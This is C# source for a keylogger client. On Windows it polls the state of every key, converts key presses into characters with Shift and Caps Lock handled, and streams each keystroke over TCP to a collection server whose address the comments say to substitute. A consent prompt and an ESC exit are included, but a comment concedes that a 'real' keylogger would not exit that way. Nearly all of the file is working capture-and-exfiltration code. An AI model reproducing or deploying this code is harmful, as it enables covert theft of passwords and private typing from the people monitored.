using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KeyLoggerClient
{
    class Program
    {
#if WINDOWS
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern int MapVirtualKey(int uCode, int uMapType);

        [DllImport("user32.dll")]
        public static extern short GetKeyState(int nVirtKey);

        const int VK_SHIFT = 0x10;
        const int VK_CAPITAL = 0x14;
        const int MAPVK_VK_TO_CHAR = 2;
#elif MACOS
        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
        private static extern IntPtr CGEventSourceCreate(int sourceStateID);

        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
        private static extern IntPtr CGEventCreateKeyboardEvent(IntPtr source, ushort key, bool keyDown);

        [DllImport("/System/Library/Frameworks/Carbon.framework/Versions/Current/Carbon")]
        private static extern void CFRelease(IntPtr cf);
#endif

        static void Main(string[] args)
        {
            // Transparency message
            Console.WriteLine("WARNING: This program will log all key presses.");
            Console.Write("Do you want to continue? (yes/no): ");
            string input = Console.ReadLine();

            if (input?.ToLower() != "yes" && input?.ToLower() != "y")
            {
                Console.WriteLine("Exiting program.");
                return;
            }

            Console.WriteLine("Keylogger is now running. Press 'ESC' to stop.");

            // Note: replace localhost ip with the server's IP address
            using TcpClient client = new TcpClient("127.0.0.1", 5001);
            using NetworkStream stream = client.GetStream();

            try
            {
                RunKeylogger(stream);
            }
            catch (System.Exception e)
            {
                Console.WriteLine("An error occurred. Keylogger stopped.");
                Console.WriteLine(e.Message);
                throw;
            }
        }

        static void RunKeylogger(NetworkStream stream)
        {
#if WINDOWS
            bool[] keyStates = new bool[256];

            while (true)
            {
                for (int vKey = 0; vKey < 256; vKey++)
                {
                    short keyState = GetAsyncKeyState(vKey);

                    if (KeyIsPressed(keyState) && !keyStates[vKey])
                    {
                        string key;

                        if (vKey == (int)ConsoleKey.Escape)
                        {
                            // note: in a real key logger, you would not exit the program on escape
                            key = "Escape";
                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
                            byte[] exitMessage = Encoding.ASCII.GetBytes(key + " ");
                            stream.Write(exitMessage, 0, exitMessage.Length);
                            return;
                        }
                        else
                        {
                            // For all other keys, use the mapping logic
                            key = GetKeyString(vKey);
                        }

                        if (!string.IsNullOrEmpty(key))
                        {
                            byte[] data = Encoding.ASCII.GetBytes(key + " ");
                            stream.Write(data, 0, data.Length);
                        }

                        keyStates[vKey] = true;

                        if (key == "Escape")
                        {
                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
                            return;
                        }
                    }
                    else if (!KeyIsPressed(keyState))
                    {
                        keyStates[vKey] = false;
                    }
                }

                Thread.Sleep(10);
            }
#elif MACOS
            // Implement macOS-specific key logging logic here
            // Note: This is a placeholder. Actual implementation will require more detailed handling of macOS key events.
            Console.WriteLine("Keylogger for macOS is not implemented.");
#endif
        }

#if WINDOWS
        static bool KeyIsPressed(short keyState)
        {
            return (keyState & 0x8000) != 0;
        }

        static string GetKeyString(int vKey)
        {
            // Map virtual key to character
            int charCode = MapVirtualKey(vKey, MAPVK_VK_TO_CHAR);

            if (charCode == 0) return null;

            char keyChar = (char)charCode;

            // Check for Shift key or Caps Lock
            bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
            bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            // Apply Shift or Caps Lock transformations
            if (char.IsLetter(keyChar))
            {
                if (shiftPressed ^ capsLockOn) // XOR: Shift or Caps Lock, but not both
                {
                    keyChar = char.ToUpper(keyChar);
                }
                else
                {
                    keyChar = char.ToLower(keyChar);
                }
            }
            else if (shiftPressed)
            {
                switch (keyChar)
                {
                    case '1': keyChar = '!'; break;
                    case '2': keyChar = '@'; break;
                    case '3': keyChar = '#'; break;
                    case '4': keyChar = '$'; break;
                    case '5': keyChar = '%'; break;
                    case '6': keyChar = '^'; break;
                    case '7': keyChar = '&'; break;
                    case '8': keyChar = '*'; break;
                    case '9': keyChar = '('; break;
                    case '0': keyChar = ')'; break;
                    case '-': keyChar = '_'; break;
                    case '=': keyChar = '+'; break;
                    case '[': keyChar = '{'; break;
                    case ']': keyChar = '}'; break;
                    case '\\': keyChar = '|'; break;
                    case ';': keyChar = ':'; break;
                    case '\'': keyChar = '"'; break;
                    case ',': keyChar = '<'; break;
                    case '.': keyChar = '>'; break;
                    case '/': keyChar = '?'; break;
                }
            }

            return keyChar.ToString();
        }
#endif
    }
}
